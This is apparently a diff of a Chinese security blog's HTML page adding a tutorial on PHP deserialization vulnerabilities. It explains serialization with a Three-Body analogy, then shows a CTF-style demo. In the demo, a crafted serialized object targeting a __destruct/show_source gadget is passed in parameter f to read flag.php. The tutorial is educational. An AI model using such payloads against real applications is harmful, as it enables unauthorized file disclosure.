+    <span class="token keyword">class</span> <span class="token class-name">BeautifulGirls</span><span class="token punctuation">{</span>
+        <span class="token comment">// 定义biu biu biu 忒否 girls的模板</span>
+        <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
+<pre><code>    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;fail_in_love&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;token keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token double-quoted-string string&quot;&gt;&quot;My name is &quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;token property&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;token variable&quot;&gt;$MissFang&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;BeautifulGirls&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;token comment&quot;&gt;//实例化了一个biu 忒否 girl叫小芳&lt;/span&gt;
+</code></pre>
+<p><span class="token delimiter important">?&gt;</span></span><br />
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></p>
+<h3>0x01 何为序列化和反序列化</h3>
+<p>了解类和对象了后，来看看什么是序列化和反序列化<br>
+（以下情景过于虚拟，推荐看官看看大刘的三体）</p>
+<blockquote>
+<p>三体中有这么一个情景，三体这个星球有三颗太阳，而且很不稳定，有时候离得近有时候离得远，有时候是一个，多的时候蹦出来仨斗地主，导致三体人长期生活在一个天气很不稳定的环境下，从而衍生出来了一种脱水的本领，仨太阳出来斗地主的时候，三体人就都脱水成为一张纸，以便保存，气候适宜的时候再由值班的人员将大家浸泡在水里，恢复形体...</p>
+</blockquote>
+<div class="image-package">
+<div class="image-container" style="max-width: 546px; max-height: 329px; background-color: transparent;">
+<div class="image-container-fill" style="padding-bottom: 60.260000000000005%;"></div>
+<div class="image-view" data-width="546" data-height="329"><img data-original-src="//upload-images.jianshu.io/upload_images/9144690-2166e95ca5baef33.png" data-original-width="546" data-original-height="329" data-original-format="image/png" data-original-filesize="224706" data-image-index="2" style="cursor: zoom-in;" class="" src="//upload-images.jianshu.io/upload_images/9144690-2166e95ca5baef33.png?imageMogr2/auto-orient/strip|imageView2/2/w/546/format/webp"></div>
+</div>
+<div class="image-caption">image.png</div>
+</div><br>
+<p>对三体人来说<br>
+脱水，就是序列化的过程<br>
+浸泡，就是反序列化</p>
+<p>而代码在运行的时候，有的时候需要将实例对象存储起来，这个时候就需要像三体人一样脱水，不过对象脱水只能变成一个字符串</p>
+<div class="_2Uzcx_"><button class="VJbwyy" type="button" aria-label="复制代码"><i aria-label="icon: copy" class="anticon anticon-copy"><svg viewBox="64 64 896 896" focusable="false" class="" data-icon="copy" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M832 64H296c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h496v688c0 4.4 3.6 8 8 8h56c4.4 0 8-3.6 8-8V96c0-17.7-14.3-32-32-32zM704 192H192c-17.7 0-32 14.3-32 32v530.7c0 8.5 3.4 16.6 9.4 22.6l173.3 173.3c2.2 2.2 4.7 4 7.4 5.5v1.9h4.2c3.5 1.3 7.2 2 11 2H704c17.7 0 32-14.3 32-32V224c0-17.7-14.3-32-32-32zM350 856.2L263.9 770H350v86.2zM664 888H414V746c0-22.1-17.9-40-40-40H232V264h432v624z"></path></svg></i></button><pre class="line-numbers  language-php"><code class="  language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token keyword">class</span> <span class="token class-name">ThreeBody</span><span class="token punctuation">{</span>
+        <span class="token comment">// 定义类</span>
+        <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token single-quoted-string string">'test'</span><span class="token punctuation">;</span>
+<pre><code>    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;fail_in_love&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;token keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token double-quoted-string string&quot;&gt;&quot;My name is &quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;token property&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;token variable&quot;&gt;$reallyTreeBody&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ThreeBody&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;token comment&quot;&gt;//实例化了一个对象&lt;/span&gt;
+
+&lt;span class=&quot;token keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;serialize&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$reallyTreeBody&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;token comment&quot;&gt;//将对象序列化后输出&lt;/span&gt;
+</code></pre>
+<p><span class="token delimiter important">?&gt;</span></span><br />
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></p>
+<p>运行后就会输出一个字符串，这个就是对象脱水<code>（序列化）</code>后的产物<br>
+</p><div class="image-package">
+<div class="image-container" style="max-width: 509px; max-height: 216px; background-color: transparent;">
+<div class="image-container-fill" style="padding-bottom: 42.44%;"></div>
+<div class="image-view" data-width="509" data-height="216"><img data-original-src="//upload-images.jianshu.io/upload_images/9144690-247cec07e75815be.png" data-original-width="509" data-original-height="216" data-original-format="image/png" data-original-filesize="7623" data-image-index="3" style="cursor: zoom-in;" class="" src="//upload-images.jianshu.io/upload_images/9144690-247cec07e75815be.png?imageMogr2/auto-orient/strip|imageView2/2/w/509/format/webp"></div>
+</div>
+<div class="image-caption">运行结果</div>
+</div><br>
+而这个字符串浸泡的时候，一定得有个模板作为标准才能恢复<p></p>
+<div class="_2Uzcx_"><button class="VJbwyy" type="button" aria-label="复制代码"><i aria-label="icon: copy" class="anticon anticon-copy"><svg viewBox="64 64 896 896" focusable="false" class="" data-icon="copy" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M832 64H296c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h496v688c0 4.4 3.6 8 8 8h56c4.4 0 8-3.6 8-8V96c0-17.7-14.3-32-32-32zM704 192H192c-17.7 0-32 14.3-32 32v530.7c0 8.5 3.4 16.6 9.4 22.6l173.3 173.3c2.2 2.2 4.7 4 7.4 5.5v1.9h4.2c3.5 1.3 7.2 2 11 2H704c17.7 0 32-14.3 32-32V224c0-17.7-14.3-32-32-32zM350 856.2L263.9 770H350v86.2zM664 888H414V746c0-22.1-17.9-40-40-40H232V264h432v624z"></path></svg></i></button><pre class="line-numbers  language-php"><code class="  language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token keyword">class</span> <span class="token class-name">ThreeBody</span><span class="token punctuation">{</span>
+        <span class="token comment">// 定义类</span>
+        <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token single-quoted-string string">'test'</span><span class="token punctuation">;</span>
+<pre><code>    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;fail_in_love&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;token keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token double-quoted-string string&quot;&gt;&quot;My name is &quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;token property&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;token variable&quot;&gt;$zhi&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token single-quoted-string string&quot;&gt;'O:9:&quot;ThreeBody&quot;:1:{s:4:&quot;name&quot;;s:4:&quot;test&quot;;}'&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;token comment&quot;&gt;// 序列化后的字符串&lt;/span&gt;
+
+&lt;span class=&quot;token variable&quot;&gt;$reallyTreeBody&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;unserialize&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$zhi&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;token comment&quot;&gt;// 把字符串浸泡恢复一下&lt;/span&gt;
+
+&lt;span class=&quot;token keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$reallyTreeBody&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;token property&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// 成为对象了，把对象的name属性输出一下&lt;/span&gt;
+</code></pre>
+<p><span class="token delimiter important">?&gt;</span></span><br />
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></p>
+<p>运行后，就会输出对象的<code>name</code><br>
+</p><div class="image-package">
+<div class="image-container" style="max-width: 400px; max-height: 182px; background-color: transparent;">
+<div class="image-container-fill" style="padding-bottom: 45.5%;"></div>
+<div class="image-view" data-width="400" data-height="182"><img data-original-src="//upload-images.jianshu.io/upload_images/9144690-6a1f68569e1b1e2e.png" data-original-width="400" data-original-height="182" data-original-format="image/png" data-original-filesize="5793" data-image-index="4" style="cursor: zoom-in;" class="" src="//upload-images.jianshu.io/upload_images/9144690-6a1f68569e1b1e2e.png?imageMogr2/auto-orient/strip|imageView2/2/w/400/format/webp"></div>
+</div>
+<div class="image-caption">image.png</div>
+</div><p></p>
+<h3>0x02 具体漏洞演示</h3>
+<p></p><div class="image-package">
+<div class="image-container" style="max-width: 450px; max-height: 323px; background-color: transparent;">
+<div class="image-container-fill" style="padding-bottom: 71.78%;"></div>
+<div class="image-view" data-width="450" data-height="323"><img data-original-src="//upload-images.jianshu.io/upload_images/9144690-5e2ae1e0aa4b1218.png" data-original-width="450" data-original-height="323" data-original-format="image/png" data-original-filesize="17963" data-image-index="5" style="cursor: zoom-in;" class="" src="//upload-images.jianshu.io/upload_images/9144690-5e2ae1e0aa4b1218.png?imageMogr2/auto-orient/strip|imageView2/2/w/450/format/webp"></div>
+</div>
+<div class="image-caption">image.png</div>
+</div><br>
+如上图，这个页面会将参数f进行反序列，然后在析构函数里面会把对象的<code>test</code>参数源码输出出来<p></p>
+<blockquote>
+<p>插一句析构函数(__destruct)，这个函数是在对象被销毁的时候调用的函数，当页面运行完时，会回收内存，将对象消毁，所以页面结束时就能触发<br>
+同时还有其他的一些函数自己去搜一搜</p>
+</blockquote>
+<p>当我们想要它显示指定的源码时，就需要构造一个对象，<code>test</code>属性内容就是文件名</p>
+<p>那我们就可以在本地先写一个指定<code>test</code>属性内容的对象，然后去序列化一下，再将字符串反序列化就能得到我们指定的一个对象（其实就是脱裤子放屁，脱水一下再去浸泡一下）</p>
+<div class="_2Uzcx_"><button class="VJbwyy" type="button" aria-label="复制代码"><i aria-label="icon: copy" class="anticon anticon-copy"><svg viewBox="64 64 896 896" focusable="false" class="" data-icon="copy" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M832 64H296c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h496v688c0 4.4 3.6 8 8 8h56c4.4 0 8-3.6 8-8V96c0-17.7-14.3-32-32-32zM704 192H192c-17.7 0-32 14.3-32 32v530.7c0 8.5 3.4 16.6 9.4 22.6l173.3 173.3c2.2 2.2 4.7 4 7.4 5.5v1.9h4.2c3.5 1.3 7.2 2 11 2H704c17.7 0 32-14.3 32-32V224c0-17.7-14.3-32-32-32zM350 856.2L263.9 770H350v86.2zM664 888H414V746c0-22.1-17.9-40-40-40H232V264h432v624z"></path></svg></i></button><pre class="line-numbers  language-php"><code class="  language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token keyword">class</span> <span class="token class-name">example</span><span class="token punctuation">{</span>
+        <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token operator">=</span><span class="token single-quoted-string string">'flag.php'</span><span class="token punctuation">;</span>
+<pre><code>    &lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;__destruct&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;token keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;show_source&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;token property&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;token variable&quot;&gt;$a&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;example&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;token keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;serialize&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+</code></pre>
+<p><span class="token delimiter important">?&gt;</span></span><br />
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></p>
+<p>运行后就能得到我们想要的对象的序列化结果</p>
+<br>
+<div class="image-package">
+<div class="image-container" style="max-width: 700px; max-height: 217px; background-color: transparent;">
+<div class="image-container-fill" style="padding-bottom: 29.28%;"></div>
+<div class="image-view" data-width="741" data-height="217"><img data-original-src="//upload-images.jianshu.io/upload_images/9144690-2949f909bcab8fc0.png" data-original-width="741" data-original-height="217" data-original-format="image/png" data-original-filesize="13637" data-image-index="6" style="cursor: zoom-in;" class="" src="//upload-images.jianshu.io/upload_images/9144690-2949f909bcab8fc0.png?imageMogr2/auto-orient/strip|imageView2/2/w/741/format/webp"></div>
+</div>
+<div class="image-caption">image.png</div>
+</div>
+<div class="_2Uzcx_"><button class="VJbwyy" type="button" aria-label="复制代码"><i aria-label="icon: copy" class="anticon anticon-copy"><svg viewBox="64 64 896 896" focusable="false" class="" data-icon="copy" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M832 64H296c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h496v688c0 4.4 3.6 8 8 8h56c4.4 0 8-3.6 8-8V96c0-17.7-14.3-32-32-32zM704 192H192c-17.7 0-32 14.3-32 32v530.7c0 8.5 3.4 16.6 9.4 22.6l173.3 173.3c2.2 2.2 4.7 4 7.4 5.5v1.9h4.2c3.5 1.3 7.2 2 11 2H704c17.7 0 32-14.3 32-32V224c0-17.7-14.3-32-32-32zM350 856.2L263.9 770H350v86.2zM664 888H414V746c0-22.1-17.9-40-40-40H232V264h432v624z"></path></svg></i></button><pre class="line-numbers  language-css"><code class="  language-css"><span class="token selector">O:7:"example":1:</span><span class="token punctuation">{</span><span class="token property">s</span><span class="token punctuation">:</span>4<span class="token punctuation">:</span><span class="token string">"test"</span><span class="token punctuation">;</span><span class="token property">s</span><span class="token punctuation">:</span>8<span class="token punctuation">:</span><span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div>
+<p>再将这个字符串传给<code>f</code>参数，就可以显示<code>flag.php</code>的内容<br>
+</p><div class="image-package">
+<div class="image-container" style="max-width: 658px; max-height: 362px; background-color: transparent;">
+<div class="image-container-fill" style="padding-bottom: 55.02%;"></div>
+<div class="image-view" data-width="658" data-height="362"><img data-original-src="//upload-images.jianshu.io/upload_images/9144690-e7cf4e57fcaaca23.png" data-original-width="658" data-original-height="362" data-original-format="image/png" data-original-filesize="23631" data-image-index="7" style="cursor: zoom-in;" class="" src="//upload-images.jianshu.io/upload_images/9144690-e7cf4e57fcaaca23.png?imageMogr2/auto-orient/strip|imageView2/2/w/658/format/webp"></div>
+</div>
+<div class="image-caption">image.png</div>
+</div><p></p>
 
       
     </div>
@@ -657,7 +635,7 @@ IIS7.0/7.5 是对php 解析时有一个类似于Nginx的解析漏洞，对任意
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="https://abtgu.github.io/WEB%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/" title="文件上传漏洞绕过技巧">https://abtgu.github.io/WEB%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/</a>
+    <a href="https://abtgu.github.io/WEB%E5%AE%89%E5%85%A8/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="PHP反序列化漏洞">https://abtgu.github.io/WEB%E5%AE%89%E5%85%A8/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>
@@ -672,7 +650,9 @@ IIS7.0/7.5 是对php 解析时有一个类似于Nginx的解析漏洞，对任意
       
         <div class="post-tags">
           
-            <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" rel="tag"> <i class="fa fa-tag"></i> 文件上传漏洞</a>
+            <a href="/tags/php/" rel="tag"> <i class="fa fa-tag"></i> php</a>
+          
+            <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" rel="tag"> <i class="fa fa-tag"></i> 反序列化漏洞</a>
           
         </div>
       
@@ -685,8 +665,8 @@ IIS7.0/7.5 是对php 解析时有一个类似于Nginx的解析漏洞，对任意
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/WEB%E5%AE%89%E5%85%A8/%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/" rel="next" title="万能密码漏洞">
-                <i class="fa fa-chevron-left"></i> 万能密码漏洞
+              <a href="/CTF/CTF%E5%85%B3%E4%BA%8Eping%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E9%97%AE%E9%A2%98/" rel="next" title="CTF关于ping命令注入问题">
+                <i class="fa fa-chevron-left"></i> CTF关于ping命令注入问题
               </a>
             
           </div>
@@ -694,10 +674,6 @@ IIS7.0/7.5 是对php 解析时有一个类似于Nginx的解析漏洞，对任意
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/Python/libnum%E5%BA%93%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/" rel="prev" title="libnum库的安装与使用">
-                libnum库的安装与使用 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -893,7 +869,7 @@ var jiathis_config={
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#一-文件上传漏洞介绍"><span class="nav-text"> 一、文件上传漏洞介绍</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#二-验证方法与绕过"><span class="nav-text"> 二、验证方法与绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#11content-length验证"><span class="nav-text"> 1.1CONTENT-LENGTH验证</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#12content-length绕过"><span class="nav-text"> 1.2CONTENT-LENGTH绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#21客户端javascript-检测通常为检测文件扩展名"><span class="nav-text"> 2.1客户端javascript 检测(通常为检测文件扩展名)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#21客户端javascript"><span class="nav-text"> 2.1客户端javascript</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-服务端mime-类型检测检测content-type-内容"><span class="nav-text"> 3. 服务端MIME 类型检测(检测Content-Type 内容)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4分析文件头内容来检查文件类型"><span class="nav-text"> 4.分析文件头内容来检查文件类型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5文件加载检测"><span class="nav-text"> 5.文件加载检测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6限制web-server对于特定类型文件的行为"><span class="nav-text"> 6.限制Web Server对于特定类型文件的行为</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#三-反制"><span class="nav-text"> 三、反制</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#null"><span class="nav-text">PHP反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#null"><span class="nav-text">0x00 何为类和对象</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#null"><span class="nav-text">0x01 何为序列化和反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#null"><span class="nav-text">0x02 具体漏洞演示</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
